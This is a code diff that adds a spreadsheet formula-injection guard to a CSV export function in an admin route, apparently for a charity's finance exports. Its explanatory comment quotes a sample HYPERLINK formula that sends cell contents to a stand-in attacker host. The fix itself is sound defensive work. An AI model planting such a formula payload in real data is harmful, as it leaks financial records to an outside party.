@@ -7,9 +7,22 @@ import { requireAdmin, AdminAuthError } from "@/app/lib/admin/require-admin";
 
 const VALID_KINDS = new Set(["receipts", "payouts", "recipients", "transactions", "audit_log"]);
 
+/**
+ * Neutralise spreadsheet formula injection.
+ *
+ * Families control receipt descriptions and photo captions. A value beginning
+ * =, +, - or @ is evaluated as a FORMULA by Excel and Sheets when the export is
+ * opened, so a description of `=HYPERLINK("https://evil/?"&A1,"receipt")` runs
+ * inside the charity's finance spreadsheet. Quoting alone does not help — the
+ * spreadsheet strips the quotes before evaluating.
+ */
+function deFormula(s: string): string {
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+}
+
 function csvField(v: any): string {
   if (v === null || v === undefined) return "";
-  const s = String(v);
+  const s = deFormula(String(v));
   if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
   return s;
 }
